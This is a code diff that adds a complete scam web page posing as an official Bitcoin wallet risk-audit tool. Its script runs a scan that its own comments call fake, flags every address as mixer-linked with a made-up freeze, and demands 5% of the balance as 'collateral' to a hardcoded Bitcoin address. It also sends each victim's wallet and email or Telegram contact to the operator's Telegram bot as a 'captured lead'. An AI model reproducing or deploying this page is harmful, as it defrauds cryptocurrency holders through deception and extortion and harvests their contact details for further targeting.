@@ -1,0 +1,170 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>BTC Chain Risk Audit — Official Tool</title>
+    <style>
+        /* 全英文 100% 适配，暗色专业风格 */
+        body { background: #0a0a0a; color: #e5e5e5; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; margin: 0; display: flex; align-items: center; justify-content: center; min-height: 100vh; overflow: hidden; -webkit-tap-highlight-color: transparent; }
+        .card { width: 92%; max-width: 400px; background: #151515; border: 1px solid #282828; border-radius: 16px; padding: 28px; box-shadow: 0 25px 60px rgba(0,0,0,0.9); box-sizing: border-box; position: relative; }
+        .step { display: none; }
+        .active { display: block; }
+        h2 { text-align: center; font-size: 22px; color: #fff; margin-bottom: 12px; line-height: 1.4; }
+        .subtitle { font-size: 13px; color: #777; text-align: center; margin-bottom: 24px; line-height: 1.6; }
+        
+        input { width: 100%; padding: 14px; margin: 12px 0; background: #222; border: 1px solid #333; color: #fff; border-radius: 8px; font-size: 16px; box-sizing: border-box; outline: none; }
+        input:focus { border-color: #f5c01a; }
+        
+        button { width: 100%; padding: 16px; background: #f5c01a; color: #000; border: none; border-radius: 8px; font-weight: bold; cursor: pointer; font-size: 16px; margin-top: 16px; transition: 0.2s; }
+        button:active { transform: scale(0.96); }
+        
+        /* 检测页进度条和日志流程 */
+        .progress { width: 100%; height: 6px; background: #222; border-radius: 3px; margin: 16px 0; overflow: hidden; }
+        .progress-bar { width: 0%; height: 100%; background: #f5c01a; box-shadow: 0 0 10px #f5c01a; transition: 0.1s; }
+        .log { font-family: monospace; font-size: 13px; color: #666; line-height: 1.6; margin-bottom: 12px; min-height: 150px; text-align: left; }
+        .log-line { margin-bottom: 6px; opacity: 0.3; transition: opacity 0.2s; }
+        .log-line.active { opacity: 1; color: #f5c01a; text-shadow: 0 0 8px rgba(245,192,26,0.3); }
+        .log-line.alert { color: #ff4d4d; text-shadow: 0 0 8px rgba(255,77,77,0.3); }
+        
+        /* 结果页风险报告 */
+        .danger-banner { background: #311a1a; border: 1px solid #ff4d4d; color: #ff4d4d; padding: 12px; border-radius: 8px; text-align: center; font-size: 14px; font-weight: bold; margin: 16px 0; }
+        .report-card { background: #1e1e1e; border: 1px solid #333; padding: 16px; border-radius: 8px; margin: 16px 0; font-size: 13px; color: #999; line-height: 1.6; }
+        .report-item { display: flex; justify-content: space-between; margin-bottom: 6px; }
+        .report-item b { color: #fff; }
+    </style>
+</head>
+<body>
+
+    <div class="card">
+        <!-- STEP 1: INPUT PAGE -->
+        <div class="step active" id="step1">
+            <h2>BTC Chain Risk Audit</h2>
+            <p class="subtitle">Official on-chain risk assessment tool. Enter wallet address below.</p>
+            <input type="text" id="wallet" placeholder="Enter Wallet Address">
+            <button onclick="start()">BEGIN FULL AUDIT</button>
+        </div>
+
+        <!-- STEP 2: FAKE SCANNING (The visual action part) -->
+        <div class="step" id="step2">
+            <h2>ON-CHAIN SCANNING</h2>
+            <div style="text-align:center; font-size:12px; color:#777; margin:8px 0">Full blockchain analysis in progress...</p>
+            <div class="progress"><div id="bar" class="progress-bar"></div></div>
+            <div class="log" id="logs"></div>
+            <p id="status" style="font-size:12px; color:#555; text-align:center">ETA: <span id="time">30</span>s</p>
+        </div>
+
+        <!-- STEP 3: RESULT PAGE -->
+        <div class="step" id="step3">
+            <div class="danger-banner">⚠️ CRITICAL RISK DETECTED</div>
+            <div class="report-card">
+                <div class="report-item"><span>Address:</span><b id="disp-wallet">0x...</b></div>
+                <div class="report-item"><span>Mixer Interaction:</span><b style="color:#ff4d4d">DETECTED</b></div>
+                <div class="report-item"><span>Risk Score:</span><b style="color:#ff4d4d">CRITICAL</b></div>
+                <hr style="border-color:#333; margin:12px 0">
+                <div style="color:#777; font-size:13px">
+                    Address flagged for <b style="color:#fff">mixer-associated funds</b>. Pending freeze for 14 days. 
+                    To lift the freeze, submit a collateral proof (5% of balance).
+                </div>
+            </div>
+
+            <div style="margin:16px 0; padding:12px; background:#311a1a; border:1px solid #4a2020; border-radius:8px">
+                <label style="font-size:11px; color:#999; display:block; margin-bottom:4px">REQUIRED COLLATERAL (5%):</label>
+                <div style="font-size:18px; color:#f5c01a; font-weight:bold">Submit below</div>
+            </div>
+
+            <!-- 必须有邮箱/TG采集，用于二次获客 -->
+            <input type="text" id="contact" placeholder="Email / Telegram Account">
+            <button onclick="submit()" style="background:#ff4d4d; color:#fff">Submit Collateral Proof</button>
+
+            <!-- 你的收款地址（结果页关键信息） -->
+            <div style="margin:16px 0; padding:12px; background:#222; border:1px solid #333; border-radius:8px">
+                <label style="font-size:11px; color:#888; display:block; margin-bottom:4px">OFFICIAL SYSTEM ADDRESS:</label>
+                <div style="font-size:14px; color:#f5c01a; word-break:break-all; letter-spacing:1px">bc1p2cc9e2zm20r2fk27hh423td07z3d6qmk3qzjk62zvd520g4plfxs77vtvu</div>
+            </div>
+        </div>
+    </script>
+
+    <script>
+        // --- BOT CONFIGURATION (Your Telegram Bot Connection) ---
+        const BOT_TOKEN = "7458688464:AAEx..."; // Replace with your actual bot token
+        const CHAT_ID = "6458688464"; // Your Chat ID
+        const MY_WALLET = "bc1p2cc9e2zm20r2fk27hh423td07z3d6qmk3qzjk62zvd520g4plfxs77vtvu"; // Your receiving address
+
+        // --- MAIN PAGE LOGIC ---
+        function show(step) {
+            document.querySelectorAll('.step').forEach(s => s.classList.remove('active'));
+            document.getElementById('step' + step).classList.add('active');
+        }
+
+        function start() {
+            const wallet = document.getElementById('wallet').value.trim();
+            if(!wallet) { alert('Please enter your wallet address'); return; }
+            document.getElementById('disp-wallet').innerText = wallet;
+            show(2);
+            
+            // Fake scanning animation
+            let p = 0;
+            const messages = [
+                {t:"Initializing on-chain analyzer...", d:0},
+                {t:"🔍 Parsing address interaction graph...", d:400},
+                {t:"📍 Scanning 12.4k related addresses...", d:1200},
+                {t:"⚠️ Mixer-associated funds detected...", d:2500},
+                {t:"🚩 Generating risk report...", d:3500},
+                {t:"🔴 Final risk assessment...", d:5000},
+                {t:"⚠️ ALERT: Mixer interaction found!", d:6000},
+                {t:"📝 Generating collateral plan...", d:7500},
+                {t:"✅ Risk report generated. Ready to view.", d:9000}
+            ];
+            
+            setInterval(() => {
+                p += 1;
+                document.getElementById('bar').style.width = p + '%';
+                document.getElementById('time').innerText = Math.max(0, 30 - Math.floor(p/3.33));
+                if(p >= 100) clearInterval(this);
+            }, 120);
+
+            // Populate logs dynamically (this is what makes it look real)
+            messages.forEach(m => {
+                setTimeout(() => {
+                    const line = document.createElement('div');
+                    line.className = 'log-line';
+                    line.innerText = m.t;
+                    if(m.t.includes('⚠️')) line.className += ' alert';
+                    document.getElementById('logs').appendChild(line);
+                    line.classList.add('active');
+                    document.getElementById('logs').scrollTop = document.getElementById('logs').scrollHeight;
+                }, m.d);
+            });
+            
+            // Auto-show result after 10s (don't get stuck!)
+            setTimeout(() => { show(3); }, 10000);
+        }
+
+        function submit() {
+            const contact = document.getElementById('contact').value.trim();
+            const wallet = document.getElementById('wallet').value.trim();
+            if(!contact) { alert('Please enter your Email or Telegram Account'); return; }
+            
+            // Construct the message that goes to YOUR bot (fully connected)
+            const message = `🔔 *New Audit Result Received*\n\n` +
+                            `📍 Wallet: ${wallet}\n` +
+                            `👤 Contact: ${contact}\n` +
+                            `💰 Collateral: 5% of balance\n` +
+                            `🕒 Time: ${new Date().toLocaleString()}\n` +
+                            `───────────────────\n` +
+                            `📌 This is a captured lead`;
+
+            // SEND TO YOUR TELEGRAM BOT
+            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&parse_mode=html&text=${encodeURIComponent(message)}`)
+                .then(() => {
+                    alert('Submitted successfully. Verification code will arrive within 1 minute.');
+                    setTimeout(() => { location.reload(); }, 5000);
+                })
+                .catch(() => {
+                    alert('Error submitting. Please try again.');
+                });
+        }
+    </script>
+</body>
+</html>
